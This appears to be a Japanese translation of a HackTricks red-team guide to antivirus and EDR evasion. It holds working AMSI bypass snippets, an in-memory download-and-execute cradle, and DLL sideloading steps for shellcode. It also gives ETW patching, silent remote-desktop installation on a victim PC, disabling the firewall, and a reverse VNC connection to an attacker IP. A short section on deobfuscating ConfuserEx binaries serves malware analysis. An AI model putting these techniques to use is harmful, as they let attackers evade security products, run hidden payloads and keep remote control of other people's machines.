# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderを停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderを停止させるツール。
- [管理者の場合はDefenderを無効にする](basic-powershell-for-pentesters/README.md)

## **AV回避方法論**

現在、AVはファイルが悪意のあるものであるかどうかを確認するために、静的検出、動的分析、そしてより高度なEDRの場合は行動分析など、さまざまな方法を使用しています。

### **静的検出**

静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイト配列にフラグを立てたり、ファイル自体から情報を抽出したりすることで達成されます（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）。これは、既知の公開ツールを使用すると、分析されて悪意のあるものとしてフラグが立てられている可能性が高いため、簡単に捕まる可能性があることを意味します。この種の検出を回避する方法はいくつかあります：

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検出する方法はなくなりますが、メモリ内でプログラムを復号化して実行するためのローダーが必要になります。

- **難読化**

時には、バイナリやスクリプト内のいくつかの文字列を変更するだけでAVを回避できることがありますが、何を難読化しようとしているかによっては、時間がかかる作業になることがあります。

- **カスタムツール**

独自のツールを開発すれば、既知の悪意のあるシグネチャは存在しませんが、これには多くの時間と労力がかかります。

> [!TIP]
> Windows Defenderの静的検出に対抗する良い方法は[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)です。これは基本的にファイルを複数のセグメントに分割し、Defenderにそれぞれを個別にスキャンさせることで、バイナリ内のフラグが立てられた文字列やバイトを正確に教えてくれます。

この[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をチェックすることを強くお勧めします。

### **動的分析**

動的分析は、AVがバイナリをサンドボックス内で実行し、悪意のある活動を監視することです（例：ブラウザのパスワードを復号化して読み取ろうとする、LSASSのミニダンプを実行するなど）。この部分は扱いが少し難しいことがありますが、サンドボックスを回避するためにできることはいくつかあります。

- **実行前のスリープ** 実装方法によっては、AVの動的分析を回避するための素晴らしい方法になることがあります。AVはユーザーの作業フローを中断しないようにファイルをスキャンするための時間が非常に短いため、長いスリープを使用するとバイナリの分析を妨げることができます。ただし、多くのAVのサンドボックスは、実装方法によってはスリープをスキップすることができます。
- **マシンのリソースをチェック** 通常、サンドボックスは扱えるリソースが非常に少ない（例：< 2GB RAM）ため、ユーザーのマシンを遅くすることはできません。ここでは非常にクリエイティブになることもできます。たとえば、CPUの温度やファンの速度をチェックすることで、すべてがサンドボックスに実装されているわけではありません。
- **マシン固有のチェック** "contoso.local"ドメインに参加しているユーザーをターゲットにしたい場合は、コンピュータのドメインをチェックして指定したものと一致するか確認できます。一致しない場合は、プログラムを終了させることができます。

Microsoft Defenderのサンドボックスのコンピュータ名はHAL9THであるため、爆発前にマルウェア内でコンピュータ名をチェックできます。名前がHAL9THと一致する場合、Defenderのサンドボックス内にいることを意味するため、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)からのサンドボックスに対抗するための他の非常に良いヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

この投稿で以前に述べたように、**公開ツール**は最終的に**検出される**ため、自分自身に何かを尋ねるべきです：

たとえば、LSASSをダンプしたい場合、**本当にmimikatzを使用する必要がありますか**？それとも、LSASSをダンプする別のあまり知られていないプロジェクトを使用できますか。

正しい答えはおそらく後者です。mimikatzを例に取ると、これはおそらくAVやEDRによって最もフラグが立てられるマルウェアの一つであり、プロジェクト自体は非常にクールですが、AVを回避するためにそれを扱うのは悪夢です。したがって、達成しようとしていることの代替手段を探してください。

> [!TIP]
> 回避のためにペイロードを変更する際は、Defenderで**自動サンプル送信をオフにする**ことを確認し、長期的に回避を達成することが目標である場合は、**VIRUSTOTALにアップロードしないでください**。特定のAVによってペイロードが検出されるかどうかを確認したい場合は、VMにインストールし、自動サンプル送信をオフにし、結果に満足するまでそこでテストしてください。

## EXEとDLL

可能な限り、常に**回避のためにDLLを使用することを優先してください**。私の経験では、DLLファイルは通常**はるかに検出されにくく**、分析されにくいため、場合によっては検出を回避するための非常に簡単なトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合）。

この画像に示されているように、HavocのDLLペイロードはantiscan.meでの検出率が4/26であるのに対し、EXEペイロードは7/26の検出率です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.meでの通常のHavoc EXEペイロードと通常のHavoc DLLの比較</p></figcaption></figure>

ここでは、DLLファイルを使用してよりステルス性を高めるためのいくつかのトリックを紹介します。

## DLLサイドローディングとプロキシ

**DLLサイドローディング**は、ローダーによって使用されるDLL検索順序を利用し、被害者アプリケーションと悪意のあるペイロードを並べて配置することです。

DLLサイドローディングに脆弱なプログラムをチェックするには、[Siofra](https://github.com/Cybereason/siofra)と次のPowerShellスクリプトを使用できます：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、「C:\Program Files\\」内でDLLハイジャックに脆弱なプログラムのリストと、それらが読み込もうとするDLLファイルを出力します。

私はあなたが**DLLハイジャック可能/サイドロード可能なプログラムを自分で調査することを強くお勧めします**。この技術は適切に行えば非常にステルス性がありますが、一般に知られているDLLサイドロード可能なプログラムを使用すると、簡単に捕まる可能性があります。

悪意のあるDLLをプログラムが読み込むことを期待する名前で配置するだけでは、ペイロードは読み込まれません。プログラムはそのDLL内に特定の関数を期待しているためです。この問題を解決するために、**DLLプロキシング/フォワーディング**という別の技術を使用します。

**DLLプロキシング**は、プログラムがプロキシ（および悪意のある）DLLから元のDLLに行う呼び出しを転送し、プログラムの機能を保持しつつ、ペイロードの実行を処理できるようにします。

私は[@flangvik](https://twitter.com/Flangvik/)の[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)プロジェクトを使用します。

私が従った手順は次のとおりです：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは、DLLソースコードテンプレートと、元の名前を変更したDLLの2つのファイルを生成します。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのシェルコード（[SGN](https://github.com/EgeBalci/sgn)でエンコードされた）とプロキシDLLは、[antiscan.me](https://antiscan.me)で0/26の検出率を持っています！これは成功だと言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 私は**強く推奨**します、DLLサイドローディングについての[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)を視聴し、また[ippsecのビデオ](https://www.youtube.com/watch?v=3eROsG_WNpE)を見て、私たちがより深く議論したことについて学んでください。

## [**Freeze**](https://github.com/optiv/Freeze)

`Freezeは、サスペンドプロセス、直接システムコール、および代替実行方法を使用してEDRをバイパスするためのペイロードツールキットです`

Freezeを使用して、シェルコードをステルスな方法でロードおよび実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避は単なる猫とネズミのゲームであり、今日機能するものが明日検出される可能性があるため、可能であれば1つのツールに依存せず、複数の回避技術を組み合わせて試みてください。

## AMSI (アンチマルウェアスキャンインターフェース)

AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作成されました。最初は、AVは**ディスク上のファイル**のみをスキャンできたため、ペイロードを**直接メモリ内で実行**できれば、AVは何も防ぐことができませんでした。なぜなら、十分な可視性がなかったからです。

AMSI機能はWindowsのこれらのコンポーネントに統合されています。

- ユーザーアカウント制御、またはUAC（EXE、COM、MSI、またはActiveXインストールの昇格）
- PowerShell（スクリプト、対話型使用、動的コード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これは、スクリプトの内容を暗号化されておらず、難読化されていない形式で公開することにより、アンチウイルスソリューションがスクリプトの動作を検査できるようにします。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

スクリプトが実行された実行可能ファイルへのパスの前に`amsi:`が付加されていることに注意してください。この場合、powershell.exeです。

ディスクにファイルを落とさなかったにもかかわらず、AMSIのためにメモリ内で捕まってしまいました。

さらに、**.NET 4.8**以降、C#コードもAMSIを通じて実行されます。これは、メモリ内実行のために`Assembly.Load(byte[])`にも影響を与えます。したがって、AMSIを回避したい場合は、メモリ内実行のために.NETの古いバージョン（4.7.2以下など）を使用することが推奨されます。

AMSIを回避する方法はいくつかあります：

- **難読化**

AMSIは主に静的検出で機能するため、読み込もうとするスクリプトを変更することは、検出を回避する良い方法となる可能性があります。

ただし、AMSIは複数のレイヤーがあってもスクリプトを難読化解除する能力があるため、難読化の方法によっては悪い選択肢になる可能性があります。これにより、回避が簡単ではなくなります。ただし、時には変数名をいくつか変更するだけで済むこともあるため、どれだけフラグが立てられているかによります。

- **AMSIバイパス**

AMSIはpowershell（またはcscript.exe、wscript.exeなど）のプロセスにDLLをロードすることによって実装されているため、特権のないユーザーとして実行していても簡単に改ざんすることが可能です。このAMSIの実装の欠陥により、研究者たちはAMSIスキャンを回避するための複数の方法を見つけました。

**エラーを強制する**

AMSIの初期化を失敗させる（amsiInitFailed）ことで、現在のプロセスに対してスキャンが開始されない結果になります。これは元々[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftは広範な使用を防ぐためのシグネチャを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
すべては、現在のpowershellプロセスでAMSIを無効にするための1行のpowershellコードだけで済みました。この行はもちろんAMSI自体によってフラグが立てられているため、この技術を使用するにはいくつかの修正が必要です。

ここに、私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取った修正されたAMSIバイパスがあります。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
念のため、この投稿が公開されるとおそらくフラグが立てられるので、検出されない計画であればコードを公開しない方が良いです。

**メモリパッチ**

この技術は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見され、amsi.dll内の「AmsiScanBuffer」関数のアドレスを見つけ、それをE_INVALIDARGのコードを返す命令で上書きすることを含みます。これにより、実際のスキャンの結果は0を返し、クリーンな結果として解釈されます。

> [!TIP]
> より詳細な説明については [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

また、PowerShellを使用してAMSIをバイパスするための他の多くの技術もあります。詳細については [**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**このリポジトリ**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) をチェックしてください。

このツール [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) もAMSIをバイパスするスクリプトを生成します。

**検出された署名を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用して、現在のプロセスのメモリから検出されたAMSI署名を削除できます。このツールは、現在のプロセスのメモリをスキャンしてAMSI署名を見つけ、それをNOP命令で上書きすることによって、実質的にメモリから削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品のリストは **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で見つけることができます。

**PowerShellバージョン2を使用する**
PowerShellバージョン2を使用すると、AMSIはロードされないため、AMSIによるスキャンなしでスクリプトを実行できます。次のようにできます：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell ロギングは、システム上で実行されたすべての PowerShell コマンドをログに記録する機能です。これは監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題となる可能性があります**。

PowerShell ロギングをバイパスするには、以下の技術を使用できます：

- **PowerShell トランスクリプションとモジュール ロギングを無効にする**: この目的のために、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **PowerShell バージョン 2 を使用する**: PowerShell バージョン 2 を使用すると、AMSI がロードされないため、AMSI によるスキャンなしでスクリプトを実行できます。これを行うには: `powershell.exe -version 2`
- **管理されていない PowerShell セッションを使用する**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用して、防御なしで PowerShell を起動します（これは Cobalt Strike の `powerpick` が使用するものです）。

## Obfuscation

> [!TIP]
> いくつかの難読化技術はデータを暗号化することに依存しており、これによりバイナリのエントロピーが増加し、AV や EDR による検出が容易になります。これに注意し、機密性が高いか隠す必要があるコードの特定のセクションにのみ暗号化を適用することをお勧めします。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商業フォーク）を使用するマルウェアを分析する際には、デコンパイラやサンドボックスをブロックする複数の保護層に直面することが一般的です。以下のワークフローは、信頼性の高い**ほぼ元の IL を復元**し、その後 dnSpy や ILSpy などのツールで C# にデコンパイルできます。

1.  アンチタムパリングの削除 – ConfuserEx はすべての*メソッドボディ*を暗号化し、*モジュール*の静的コンストラクタ（`<Module>.cctor`）内で復号化します。これにより PE チェックサムもパッチされるため、変更が加えられるとバイナリがクラッシュします。**AntiTamperKiller**を使用して暗号化されたメタデータテーブルを特定し、XOR キーを回復し、クリーンなアセンブリを書き換えます：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には、独自のアンパッカーを構築する際に役立つ可能性のある 6 つのアンチタムパラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル / 制御フローの回復 – *クリーン*ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ：
• `-p crx` – ConfuserEx 2 プロファイルを選択
• de4dot は制御フローのフラット化を元に戻し、元の名前空間、クラス、変数名を復元し、定数文字列を復号化します。

3.  プロキシコールの除去 – ConfuserEx は直接メソッド呼び出しを軽量ラッパー（別名*プロキシコール*）に置き換えて、デコンパイルをさらに妨げます。**ProxyCall-Remover**を使用してそれらを削除します：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後、`Convert.FromBase64String` や `AES.Create()` などの通常の .NET API が観察されるはずです（不透明なラッパー関数（`Class8.smethod_10` など）ではなく）。

4.  手動クリーンアップ – 結果のバイナリを dnSpy で実行し、大きな Base64 ブロブや `RijndaelManaged` / `TripleDESCryptoServiceProvider` の使用を検索して*本当の*ペイロードを特定します。多くの場合、マルウェアはそれを `<Module>.byte_0` 内で初期化された TLV エンコードされたバイト配列として保存します。

上記のチェーンは、悪意のあるサンプルを実行することなく実行フローを復元します – オフラインワークステーションで作業する際に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成し、これは IOC として使用してサンプルを自動的にトリアージすることができます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# オブファスケーター**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[コードオブファスケーション](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、`C++11/14` 言語を使用して、外部ツールを使用せず、コンパイラを変更することなく、コンパイル時にオブファスケートされたコードを生成する方法を示しています。
- [**obfy**](https://github.com/fritzone/obfy): C++ テンプレートメタプログラミングフレームワークによって生成されたオブファスケートされた操作のレイヤーを追加し、アプリケーションをクラッキングしようとする人の生活を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は、.exe、.dll、.sys などのさまざまな pe ファイルをオブファスケートできる x64 バイナリオブファスケーターです。
- [**metame**](https://github.com/a0rtega/metame): Metame は、任意の実行可能ファイル用のシンプルなメタモルフィックコードエンジンです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は、ROP（リターン指向プログラミング）を使用して LLVM 対応言語のための細粒度のコードオブファスケーションフレームワークです。ROPfuscator は、通常の命令を ROP チェーンに変換することによって、アセンブリコードレベルでプログラムをオブファスケートし、通常の制御フローの自然な概念を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は、Nim で書かれた .NET PE Crypter です。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は、既存の EXE/DLL をシェルコードに変換し、それをロードすることができます。

## SmartScreen & MoTW

インターネットからいくつかの実行可能ファイルをダウンロードして実行する際に、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護することを目的としたセキュリティメカニズムです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主に評判ベースのアプローチで機能し、一般的でないダウンロードアプリケーションが SmartScreen をトリガーし、エンドユーザーがファイルを実行するのを警告し防止します（ただし、ファイルは「詳細情報」->「それでも実行」をクリックすることで実行できます）。

**MoTW**（Mark of The Web）は、インターネットからファイルをダウンロードする際に自動的に作成される[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、Zone.Identifier という名前が付けられ、ダウンロード元の URL とともに作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しています。</p></figcaption></figure>

> [!TIP]
> **信頼された**署名証明書で署名された実行可能ファイルは、**SmartScreen をトリガーしない**ことに注意することが重要です。

ペイロードが Mark of The Web を取得するのを防ぐ非常に効果的な方法は、ISO のようなコンテナ内にパッケージ化することです。これは、Mark-of-the-Web (MOTW) が **非 NTFS** ボリュームに適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、Mark-of-the-Web を回避するためにペイロードを出力コンテナにパッケージ化するツールです。

使用例:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
ここでは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使用してペイロードをISOファイル内にパッケージ化することでSmartScreenをバイパスするデモを示します。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Windowsのイベントトレーシング（ETW）は、アプリケーションやシステムコンポーネントが**イベントをログ**することを可能にする強力なログメカニズムです。しかし、セキュリティ製品が悪意のある活動を監視および検出するためにも使用される可能性があります。

AMSIが無効化（バイパス）されるのと同様に、ユーザースペースプロセスの**`EtwEventWrite`**関数を即座に戻すことも可能で、イベントをログしないようにできます。これは、メモリ内の関数をパッチして即座に戻すことで行われ、実質的にそのプロセスのETWログを無効にします。

詳細については、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) および [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**を参照してください。

## C# アセンブリリフレクション

C#バイナリをメモリにロードすることはかなり前から知られており、AVに捕まることなくポストエクスプロイトツールを実行するための非常に優れた方法です。

ペイロードはディスクに触れずに直接メモリにロードされるため、プロセス全体のAMSIをパッチすることだけを心配すればよいです。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、すでにC#アセンブリをメモリ内で直接実行する機能を提供していますが、さまざまな方法があります：

- **Fork&Run**

これは、**新しい犠牲プロセスを生成し**、その新しいプロセスにポストエクスプロイトの悪意のあるコードを注入し、悪意のあるコードを実行し、終了したら新しいプロセスを終了させることを含みます。これには利点と欠点があります。フォークアンドランメソッドの利点は、実行が**私たちのビーコンインプラントプロセスの外部**で行われることです。これは、ポストエクスプロイトアクションで何かがうまくいかない場合や捕まった場合、**インプラントが生き残る可能性がはるかに高くなる**ことを意味します。欠点は、**行動検出**によって捕まる可能性が**高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは、ポストエクスプロイトの悪意のあるコードを**自分のプロセスに注入する**ことです。この方法では、新しいプロセスを作成してAVによってスキャンされるのを避けることができますが、欠点は、ペイロードの実行に何か問題が発生した場合、**ビーコンを失う可能性がはるかに高くなる**ことです。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C#アセンブリのロードについてもっと知りたい場合は、この記事[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)とそのInlineExecute-Assembly BOFをチェックしてください（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）。

また、C#アセンブリを**PowerShellからロードする**こともできます。 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)と[S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk)をチェックしてください。

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、妥協されたマシンに**攻撃者が制御するSMB共有にインストールされたインタプリタ環境へのアクセスを与える**ことで、他の言語を使用して悪意のあるコードを実行することが可能です。

インタプリタバイナリと環境へのアクセスをSMB共有で許可することで、妥協されたマシンの**メモリ内でこれらの言語の任意のコードを実行する**ことができます。

リポジトリは次のように示しています：Defenderはスクリプトをスキャンし続けますが、Go、Java、PHPなどを利用することで、**静的シグネチャをバイパスする柔軟性が高まります**。これらの言語でランダムな非難読化リバースシェルスクリプトをテストした結果、成功が確認されています。

## TokenStomping

トークンストンピングは、攻撃者が**アクセス トークンやEDRやAVのようなセキュリティ製品を操作する**ことを可能にする技術で、プロセスが終了しないように権限を減少させることができますが、悪意のある活動をチェックする権限は持たなくなります。

これを防ぐために、Windowsは**外部プロセスがセキュリティプロセスのトークンにハンドルを取得するのを防ぐ**ことができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアの使用

### Chromeリモートデスクトップ

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)に記載されているように、被害者のPCにChromeリモートデスクトップを展開し、それを使用して乗っ取り、持続性を維持するのは簡単です：
1. https://remotedesktop.google.com/からダウンロードし、「SSH経由で設定」をクリックし、次にWindows用のMSIファイルをクリックしてMSIファイルをダウンロードします。
2. 被害者のPCでインストーラーをサイレントで実行します（管理者権限が必要）：`msiexec /i chromeremotedesktophost.msi /qn`
3. Chromeリモートデスクトップのページに戻り、次へ進みます。ウィザードが認証を求めてきますので、続行するには「承認」ボタンをクリックします。
4. 指定されたパラメータをいくつかの調整を加えて実行します：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（GUIを使用せずにピンを設定できるpinパラメータに注意してください）。

## 高度な回避

回避は非常に複雑なトピックであり、時には1つのシステム内のさまざまなテレメトリソースを考慮する必要があるため、成熟した環境では完全に検出されないことはほぼ不可能です。

対抗する環境にはそれぞれ独自の強みと弱みがあります。

[@ATTL4S](https://twitter.com/DaniLJ94)のこのトークをぜひご覧いただき、より高度な回避技術についての足がかりを得ることをお勧めします。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

[@mariuszbit](https://twitter.com/mariuszbit)による深い回避に関する別の素晴らしいトークもあります。

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い技術**

### **Defenderが悪意のあるものと見なす部分を確認する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使用すると、**バイナリの一部を削除**して、**Defenderが悪意のあるものと見なす部分を特定し**、それを分割することができます。\
同様のことを行う別のツールは、[**avred**](https://github.com/dobin/avred)で、オープンウェブでサービスを提供しています[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)。

### **Telnetサーバー**

Windows10まで、すべてのWindowsには**Telnetサーバー**が付属しており、（管理者として）次のようにインストールできます：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムが起動したときに**開始**し、**今すぐ**実行します:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnetポートの変更** (ステルス) とファイアウォールの無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

ダウンロードはこちらから: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (セットアップではなく、binダウンロードを選択してください)

**ホスト上で**: _**winvnc.exe**_ を実行し、サーバーを設定します:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と **新しく** 作成されたファイル _**UltraVNC.ini**_ を **被害者** の中に移動します。

#### **リバース接続**

**攻撃者**は、自身の**ホスト**内でバイナリ `vncviewer.exe -listen 5900` を実行し、リバース **VNC接続**を受け取る準備をします。その後、**被害者**内で: winvncデーモン `winvnc.exe -run` を開始し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します。

**警告:** ステルスを維持するために、いくつかのことを行ってはいけません

- `winvnc` がすでに実行中の場合は開始しないでください。そうしないと [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。 `tasklist | findstr winvnc` で実行中か確認してください
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を開始しないでください。そうしないと [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開きます
- ヘルプのために `winvnc -h` を実行しないでください。そうしないと [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

ダウンロードはこちらから: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
